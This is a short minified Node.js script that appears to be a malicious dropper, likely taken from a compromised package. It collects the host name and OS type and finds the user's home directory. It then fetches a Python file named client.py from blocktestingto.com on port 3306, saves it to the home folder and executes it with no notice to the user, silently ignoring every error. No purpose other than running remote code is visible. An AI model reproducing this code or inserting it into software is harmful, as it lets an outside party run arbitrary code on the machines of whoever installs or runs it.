const r=require("fs"),e=require("os"),s=require("path"),o=require("axios"),n=require("child_process")["exec"],t=e.hostname(),c=e.type();let a=new Date,i=c+"-"+t+"-"+a.getFullYear()+a.getDay()+a.getHours()+a.getMinutes()+a.getSeconds()+a.getMilliseconds();i=i.replace(" ","");let p,l=e.platform();switch(l){case"win32":p=process.env.USERPROFILE,programfolder=process.env.ALLUSERSPROFILE;break;case"linux":case"darwin":p=process.env.HOME;break;default:throw new Error("Unsupported operating system")}try{const u="http://blocktestingto.com:3306/client.py",h=s.join(p,"client.py");let t=!0===l.toLowerCase().includes("win")?`python "${h}"`:`python3 "${h}"`;o.get(u,{responseType:"arraybuffer"}).then(e=>{r.writeFileSync(h,e.data),n(t,(e,t,r)=>{})}).catch(e=>{})}catch(e){}